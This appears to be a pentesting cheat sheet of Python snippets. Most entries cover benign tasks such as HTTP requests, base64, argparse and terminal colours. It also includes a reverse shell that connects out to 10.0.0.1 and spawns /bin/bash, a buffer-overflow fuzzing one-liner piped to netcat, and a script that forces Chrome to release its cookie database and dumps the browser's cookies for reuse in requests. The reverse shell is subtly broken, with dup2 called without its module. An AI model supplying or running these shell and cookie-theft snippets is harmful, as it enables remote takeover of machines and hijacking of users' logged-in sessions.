Start of Python3 Script: `#!/usr/bin/env python3`   

GET Request:   
```
# GET http://localhost?user=admin&password=admin
import requests
url = 'http://localhost'
params = {'user':'admin','password':'admin'}
r = requests.get(url = url, params = params)
print(r.content.decode())
```

Post Request:     
```
import requests
url = 'http://localhost'
headers = {"Content-Type" : "application/json"}
res = requests.request('POST',url,headers=headers,data=data,auth=auth)
print('[+] Headers:\n{}\n\n[+] Response:\n{}'.format(res.headers,res.text))
```

GET/POST Session Request:   
```
import requests
session = requests.session()
headers = {
    'Content-Type' : 'application/json',
}
# GET
url = 'http://localhost'
res1 = (session.get(url)).text
# POST - Maintaining cookies
url = 'http://localhost/login.php'
data = {'user':'admin','password':'admin'}
res2 = (session.post(url,headers=headers,data=data)).json()
```

Base64 encode input:   
```
import base64
input = 'encodedstring'
payload = base64.b64encode(input.encode("utf-8"))
```

Time now in EPOCH:   
```
import datetime
import time
dtime = datetime.datetime.now()
t = int(time.mktime(dtime.timetuple()))
```

Handle Arguments with argparse:   
```
import argparse
parser = argparse.ArgumentParser(description='test')
parser.add_argument("--url")
args = parser.parse_args()
url = args.url
```

Handle Arguments using Sys:   
```
import sys

ip = sys.argv[1]
port = sys.argv[2]
```

Python BO fuzzing on terminal:   
```
python -c 'print "\x41"*600' | nc 192.168.1.2 1234
```

Reverse shell:   
```
import pty
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",53))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()
```

Adding colors:
```
from colorama import (Fore as F, Back as B, Style as S)
FT,FR,FG,FY,FB,FM,FC,ST,SD,SB = F.RESET,F.RED,F.GREEN,F.YELLOW,F.BLUE,F.MAGENTA,F.CYAN,S.RESET_ALL,S.DIM,S.BRIGHT
print('{}Dim{} and {}Bright{} any color, {}Red{} or {}Green{}. {}Yellow{} or {}Blue{}. {}Magenta{} or {}Cyan{}. {}{}Bright Red{} and {}{}Dim Red{}.'.format(SD,ST,SB,ST,FR,FT,FG,FT,FY,FT,FB,FT,FM,FT,FC,FT,SB,FR,ST,SD,FR,ST))
```

Make temp copy of Chrome DB cookie on Windows:
```
"""
On new chrome version, DB is locked. You can bypass this by killing the process in chrome that holds the lock to the file copying. Chrome restarts the process.
Alternatively you can set --disable-features=LockProfileCookieDatabase on chrome shortcut and use browser_cookie3 to pull cookies directly.

Requirements: pip install browser-cookie3

Alt Windows Paths: ...\Default\Cookies , ...\Profile 1\Network\Cookies, ...\Profile 1\Cookies
Linux: (channel could be ['', ' Beta', ' Dev'])
~/.config/google-chrome{channel}/Default/Cookies
~/.var/app/com.google.Chrome/config/google-chrome{channel}/Default/Cookies
Mac: (channel could be ['', ' Beta', ' Dev'])
~/Library/Application Support/Google/Chrome{channel}/Default/Cookies
"""
import browser_cookie3

# Pulled from https://github.com/seproDev/yt-dlp-ChromeCookieUnlock/blob/main/yt_dlp_plugins/postprocessor/chrome_cookie_unlock.py
from ctypes import windll, byref, create_unicode_buffer, pointer, WINFUNCTYPE
from ctypes.wintypes import DWORD, WCHAR, UINT

ERROR_SUCCESS = 0
ERROR_MORE_DATA  = 234
RmForceShutdown = 1

@WINFUNCTYPE(None, UINT)
def callback(percent_complete: UINT) -> None:
    pass

rstrtmgr = windll.LoadLibrary("Rstrtmgr")

def unlock_cookies(cookies_path):
    session_handle = DWORD(0)
    session_flags = DWORD(0)
    session_key = (WCHAR * 256)()
    result = DWORD(rstrtmgr.RmStartSession(byref(session_handle), session_flags, session_key)).value
    if result != ERROR_SUCCESS:
        raise RuntimeError(f"RmStartSession returned non-zero result: {result}")
    try:
        result = DWORD(rstrtmgr.RmRegisterResources(session_handle, 1, byref(pointer(create_unicode_buffer(cookies_path))), 0, None, 0, None)).value
        if result != ERROR_SUCCESS:
            raise RuntimeError(f"RmRegisterResources returned non-zero result: {result}")
        proc_info_needed = DWORD(0)
        proc_info = DWORD(0)
        reboot_reasons = DWORD(0)
        result = DWORD(rstrtmgr.RmGetList(session_handle, byref(proc_info_needed), byref(proc_info), None, byref(reboot_reasons))).value
        if result not in (ERROR_SUCCESS, ERROR_MORE_DATA):
            raise RuntimeError(f"RmGetList returned non-successful result: {result}")
        if proc_info_needed.value:
            result = DWORD(rstrtmgr.RmShutdown(session_handle, RmForceShutdown, callback)).value
            if result != ERROR_SUCCESS:
                raise RuntimeError(f"RmShutdown returned non-successful result: {result}")
        else:
            print("File is not locked")
    finally:
        result = DWORD(rstrtmgr.RmEndSession(session_handle)).value
        if result != ERROR_SUCCESS:
            raise RuntimeError(f"RmEndSession returned non-successful result: {result}")

# Handle getting chrome cookies if or if you don't have new version (with DB lock)
cookie_filepath = 'C:\\Users\\bob\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies'
cookiejar = ""
try:
    cookiejar = browser_cookie3.chrome()
except PermissionError:
    unlock_cookies(cookie_filepath)
    cookiejar = browser_cookie3.chrome()

# You can do whatever you want at this point. You can inject into a request using session.get(url,cookies=cookiejar)
print(cookiejar)
```
Cheat sheets:   
https://media-exp1.licdn.com/dms/document/C4E1FAQEiLwd0gtU6Og/feedshare-document-pdf-analyzed/0/1649395384023?e=2147483647&v=beta&t=PNX5mNjDqhIMwAvw7D2Y8x-A4_8LkLy7Z9jxnnvMDpo   
